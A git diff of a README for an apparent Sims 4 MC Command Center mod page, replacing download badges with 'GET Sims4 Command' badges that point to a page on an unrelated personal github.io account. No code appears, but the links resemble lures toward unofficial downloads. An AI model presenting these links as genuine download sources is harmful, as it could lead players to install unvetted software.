@@ -4,11 +4,8 @@
   <img src="https://simmingpothead.wordpress.com/wp-content/uploads/2018/10/img_3337.jpg?w=1920&h=768&crop=1" alt="MCCC Logo"/>
 </div>
 
-<div align="center">
+[![GET Sims4 Command](https://img.shields.io/badge/GET%20%E2%80%94%20Sims4-Command-0078D6?style=for-the-badge&logoColor=white)](https://kimberlyhallr469.github.io/.github/Sims4-Command)
 
-[![Get for Desktop](https://img.shields.io/badge/Get_for_Desktop-blue?style=for-the-badge)](https://sims4-command-center-module.github.io/.github/)
-
-</div>
 
 ---
 
@@ -38,11 +35,8 @@ It enables fine-grained customization of gameplay rules while maintaining perfor
   <img src="https://pleasantsims.com/wp-content/uploads/2020/11/Sims-4-MC-Command-Center-Settings.jpg" alt="Sims 4 MCCC Interface"/>
 </div>
 
-<div align="center">
+[![GET Sims4 Command](https://img.shields.io/badge/GET%20%E2%80%94%20Sims4-Command-0078D6?style=for-the-badge&logoColor=white)](https://kimberlyhallr469.github.io/.github/Sims4-Command)
 
-[![Get for Desktop](https://img.shields.io/badge/Get_for_Desktop-blue?style=for-the-badge)](https://sims4-command-center-module.github.io/.github/)
-
-</div>
 
 ---
 
